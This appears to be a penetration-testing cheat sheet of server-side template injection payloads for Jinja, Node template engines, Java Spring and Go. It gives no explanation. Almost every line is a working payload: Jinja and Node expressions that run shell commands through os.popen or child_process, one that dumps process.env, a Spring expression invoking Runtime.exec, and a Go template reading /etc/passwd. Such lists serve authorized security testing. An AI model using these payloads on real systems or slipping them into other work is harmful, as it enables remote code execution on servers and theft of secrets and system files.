## Jinja

- **Using os.wrap_close**
  ```
  {{'_'.__class__.__base__.__subclasses__()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  {{'_'.__class__.__base__.__subclasses__()[<OS._WRAP_CLOSE>].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
  ```

- **Using other parameters**
```
{% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&command=id&key=payload
```

## Node

- **Method 1**
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
#{7*7}
#{JSON.stringify(this.constructor.constructor('return process.env')())}
#{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id", { encoding: "utf8" })')()}
{{this.constructor.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## Java

- Spring framework
    - `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}`

## Go

- `{{ .File "/etc/passwd" }}` 
